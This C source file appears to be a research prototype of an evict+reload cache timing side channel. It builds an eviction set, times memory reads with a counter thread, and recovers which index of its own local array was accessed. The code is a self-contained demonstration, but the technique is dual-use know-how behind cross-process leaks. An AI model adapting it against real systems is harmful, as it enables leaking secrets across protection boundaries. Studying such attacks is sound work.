/*
	evict + reload 2 c file

    This will actually determine the SECRET that is accessed  
*/
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include "urd00m_output.h"
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif


/*
##############################################################
#                      THREAD TIMER                          #
##############################################################
*/
volatile uint64_t counter; //timing info

// timer thread
void timerthread() {
  while(1) {
    counter++;
  }
}

// after tests same as rdtscp (maybe have it return counter?)
void read_timer(uint64_t* time) {
  // barrier
  asm("lfence;\n\tmfence\nsfence\n");

  // read
  *time = counter; 

  // barrier
  asm("lfence;\n\tmfence\nsfence\n");
}


/*
##############################################################
#                      MAIN PROGRAM                          #
##############################################################
*/
#define SECRET 678
#define THRESHOLD 55
#define N 70L
#define NUM_TRIALS 10000
#define STRIDE (1024L * 1048576)
#define SHARED_SIZE 1024

int main(void) {
  INFO("Evict + reload attack\n");

  // Timing items
  pthread_t tid;
  pthread_create(&tid, NULL, timerthread, NULL);
  volatile uint64_t start, elapsed;

  // Data items
  uint64_t data[SHARED_SIZE];
  for(int i = 0; i < SHARED_SIZE; i++) data[i] = 0;

  // Build Eviction Set
  int* x;
  x = (int *)malloc(sizeof(*x)*(N*(STRIDE/4) + N*16 + 100));  // allocated our memory
  INFO("Address x %p\n", x);
  volatile int* addrs[N];
  for(long i = 0; i < N; i++) { // divide stride by 4 to account for the *4 attached by compiler 
    addrs[i] = (int*)x + i*(STRIDE/4) + i*16;  //formula listed in i7_writeup.md
    //INFO("Addr %p %p %d %d\n", addrs[i], &x[i*(STRIDE/4)+i*16], i*(STRIDE/4)+i*16, *addrs[i]);
  }
  INFO("Eviction set built\n");

  // creating shared memory component
  int shared[SHARED_SIZE];
  shared[SECRET] = 0xdeadbeef;

  // run attack
  volatile int junk = 0;
  for(int trial_num = 0; trial_num < NUM_TRIALS; trial_num++) {
    // isb
    asm("lfence\nmfence\nsfence\n");

    // evict
    for(long i = 0; i < N; i++) {
      int mix_i = ((i * 167) + 13) % N; //mix to avoid prefetchers and other things
      volatile int* point = (int*)addrs[mix_i];
      junk = *point;
    }

    // isb
    asm("lfence\nmfence\nsfence\n");
    
    // access (bring to cache)
    volatile int* secret_addr = &shared[SECRET];
    junk = *secret_addr;
    read_timer(&elapsed);

    // isb
    asm("lfence\nmfence\nsfence\n");
    
    // test all addresses
    for(int i = 0; i < SHARED_SIZE; i++) {
      //for(int i = 678; i < 679; i++) {
      int mix_i = ((i * 167) + 13) % SHARED_SIZE; //mix to avoid prefetchers and other things
      //int mix_i = i;
      volatile int* p = &shared[mix_i];
      read_timer(&start);
      junk = *p;
      read_timer(&elapsed);
      elapsed -= start;

      // check
      if(elapsed < THRESHOLD) {
        data[mix_i]++;
        //INFO("HIT %d\n", elapsed);
      }
    }

    //isb
    asm("lfence\nmfence\nsfence\n");
  }

  // results
  for(int i = 0; i < SHARED_SIZE; i++) {
    WARN("%d %d\n", i, data[i]);
  }
  
  // clean up
  pthread_join(&tid, NULL);
  return 0;
}
